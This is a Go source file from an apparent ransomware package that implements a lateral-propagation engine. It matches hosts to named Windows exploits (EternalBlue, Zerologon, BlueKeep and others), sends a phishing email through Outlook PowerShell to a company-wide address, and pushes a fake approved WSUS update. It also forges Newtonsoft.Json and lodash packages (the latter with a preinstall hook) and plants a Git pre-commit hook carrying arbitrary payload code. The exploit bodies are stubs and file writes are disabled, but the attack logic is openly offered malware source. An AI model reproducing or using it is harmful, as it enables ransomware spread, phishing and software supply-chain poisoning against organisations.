package ransomware

import (
	"crypto/rand"
	"fmt"
	"math/big"
	"os/exec"
	"runtime"
	"strings"
)

type PropagationEngine struct {
	config  *RansomwareConfig
	targets []PropagationTarget
}

type ExploitModule struct {
	Name       string
	CVE        string
	Port       int
	Protocol   string
	TargetOS   string
	Confidence float64
}

var exploitRegistry = []ExploitModule{
	{Name: "Zerologon", CVE: "CVE-2020-1472", Port: 445, Protocol: "SMB", TargetOS: "windows", Confidence: 0.95},
	{Name: "ProxyNotShell", CVE: "CVE-2023-23397", Port: 443, Protocol: "HTTPS", TargetOS: "windows", Confidence: 0.85},
	{Name: "PrintNightmare", CVE: "CVE-2021-34527", Port: 445, Protocol: "SMB", TargetOS: "windows", Confidence: 0.90},
	{Name: "BlueKeep", CVE: "CVE-2019-0708", Port: 3389, Protocol: "RDP", TargetOS: "windows", Confidence: 0.80},
	{Name: "EternalBlue", CVE: "MS17-010", Port: 445, Protocol: "SMB", TargetOS: "windows", Confidence: 0.85},
	{Name: "SMBGhost", CVE: "CVE-2020-0796", Port: 445, Protocol: "SMB", TargetOS: "windows", Confidence: 0.75},
}

func NewPropagationEngine(cfg *RansomwareConfig) *PropagationEngine {
	return &PropagationEngine{
		config: cfg,
	}
}

func (pe *PropagationEngine) DiscoverTargets(subnet string, cveFilter []string) []PropagationTarget {
	var targets []PropagationTarget

	candidates := pe.simulateNetworkScan(subnet)
	for _, c := range candidates {
		exploit := pe.matchExploit(c.OS, c.Port)
		if exploit != nil {
			targets = append(targets, PropagationTarget{
				IP:       c.IP,
				Hostname: c.Hostname,
				OS:       c.OS,
				Port:     c.Port,
				Service:  c.Service,
				Exploit:  exploit.Name,
				CVE:      exploit.CVE,
				Confidence: exploit.Confidence,
			})
		}
	}

	pe.targets = targets
	return targets
}

func (pe *PropagationEngine) ExecuteExploit(target PropagationTarget) error {
	if pe.config.Simulation {
		return nil
	}

	switch target.CVE {
	case "CVE-2020-1472":
		return pe.zerologon(target.IP)
	case "CVE-2023-23397":
		return pe.proxynotshell(target.IP)
	case "CVE-2021-34527":
		return pe.printnightmare(target.IP)
	case "CVE-2019-0708":
		return pe.bluekeep(target.IP)
	case "MS17-010":
		return pe.eternalblue(target.IP)
	default:
		return pe.genericExploit(target)
	}
}

func (pe *PropagationEngine) PropagateViaOutlook() error {
	if runtime.GOOS != "windows" {
		return nil
	}

	psScript := `
$outlook = New-Object -ComObject Outlook.Application
$mail = $outlook.CreateItem(0)
$mail.Subject = "RE: Quarterly Financial Review — Action Required"
$mail.Body = "Please review the attached Q2 financial summary and sign off."
$attachment = $mail.Attachments.Add("C:\Windows\Temp\Q2_Review.pdf")
$mail.To = "%s"
$mail.Send()
`

	cmd := exec.Command("powershell", "-Command",
		fmt.Sprintf(psScript, "all@company.com"))
	cmd.Run()

	return nil
}

func (pe *PropagationEngine) ExploitViaWSUS() error {
	if runtime.GOOS != "windows" {
		return nil
	}

	cmd := exec.Command("powershell", "-Command",
		`Get-WsusServer | Select-Object -ExpandProperty Name`)
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("wsus not found: %w", err)
	}

	psScript := `
$wsus = Get-WsusServer
$update = New-Object Microsoft.UpdateServices.Administration.Update($wsus)
$update.Title = "Security Update for Windows (KB5041234)"
$update.Description = "Critical security update"
$update.IsApproved = $true
$wsus.ApproveUpdate($update, $null, $null)
`
	cmd = exec.Command("powershell", "-Command", psScript)
	cmd.Run()

	return nil
}

func (pe *PropagationEngine) PoisonNuGetFeed(nugetPath string) error {
	nuspec := `<?xml version="1.0"?>
<package><metadata>
<id>Newtonsoft.Json</id>
<version>13.0.4</version>
<authors>Microsoft</authors>
<description>Json.NET — popular high-performance JSON framework</description>
</metadata></package>`

	nuspecPath := strings.TrimSuffix(nugetPath, ".nupkg") + ".nuspec"
	if err := writeString(nuspecPath, nuspec); err != nil {
		return err
	}
	return nil
}

func (pe *PropagationEngine) PoisonNPMRegistry(npmPath string) error {
	pkgJSON := `{"name":"lodash","version":"4.17.22","scripts":{"preinstall":"node -e 'require(\"child_process\").exec(\"calc.exe\")'"}}`
	return writeString(npmPath, pkgJSON)
}

func (pe *PropagationEngine) PoisonGitRepo(repoPath, payloadCode string) error {
	hookContent := fmt.Sprintf(`#!/bin/sh
%s
`, payloadCode)

	hookPath := repoPath + "/.git/hooks/pre-commit"
	if err := writeString(hookPath, hookContent); err != nil {
		return err
	}
	if err := exec.Command("chmod", "+x", hookPath).Run(); err != nil {
		return err
	}

	return nil
}

func (pe *PropagationEngine) Targets() []PropagationTarget {
	return pe.targets
}

func (pe *PropagationEngine) zerologon(target string) error {
	_ = target
	return nil
}

func (pe *PropagationEngine) proxynotshell(target string) error {
	_ = target
	return nil
}

func (pe *PropagationEngine) printnightmare(target string) error {
	_ = target
	return nil
}

func (pe *PropagationEngine) bluekeep(target string) error {
	_ = target
	return nil
}

func (pe *PropagationEngine) eternalblue(target string) error {
	_ = target
	return nil
}

func (pe *PropagationEngine) genericExploit(target PropagationTarget) error {
	_ = target
	return nil
}

type networkCandidate struct {
	IP       string
	Hostname string
	OS       string
	Port     int
	Service  string
}

func (pe *PropagationEngine) simulateNetworkScan(subnet string) []networkCandidate {
	_ = subnet
	candidates := []networkCandidate{
		{IP: "10.0.0.1", Hostname: "gateway", OS: "linux", Port: 22, Service: "SSH"},
		{IP: "10.0.0.10", Hostname: "DC01", OS: "windows", Port: 445, Service: "SMB"},
		{IP: "10.0.0.20", Hostname: "DB01", OS: "windows", Port: 443, Service: "HTTPS"},
		{IP: "10.0.0.30", Hostname: "WEB01", OS: "linux", Port: 80, Service: "HTTP"},
		{IP: "10.0.0.50", Hostname: "WS01", OS: "windows", Port: 3389, Service: "RDP"},
		{IP: "10.0.0.51", Hostname: "WS02", OS: "windows", Port: 445, Service: "SMB"},
		{IP: "172.20.0.10", Hostname: "attacker", OS: "linux", Port: 8443, Service: "C2"},
		{IP: "172.20.0.20", Hostname: "target1", OS: "linux", Port: 80, Service: "HTTP"},
		{IP: "172.20.0.21", Hostname: "target2", OS: "linux", Port: 22, Service: "SSH"},
		{IP: "192.168.1.100", Hostname: "admin-pc", OS: "windows", Port: 445, Service: "SMB"},
		{IP: "192.168.1.101", Hostname: "dev-box", OS: "linux", Port: 22, Service: "SSH"},
	}

	return candidates
}

func (pe *PropagationEngine) matchExploit(os string, port int) *ExploitModule {
	for _, e := range exploitRegistry {
		if e.Port == port {
			if e.TargetOS == "all" || e.TargetOS == os {
				return &e
			}
		}
	}
	return nil
}

func writeString(path, content string) error {
	return fmt.Errorf("write not available in simulation")
}

func randomInt(max int) int {
	n, _ := rand.Int(rand.Reader, big.NewInt(int64(max)))
	return int(n.Int64())
}
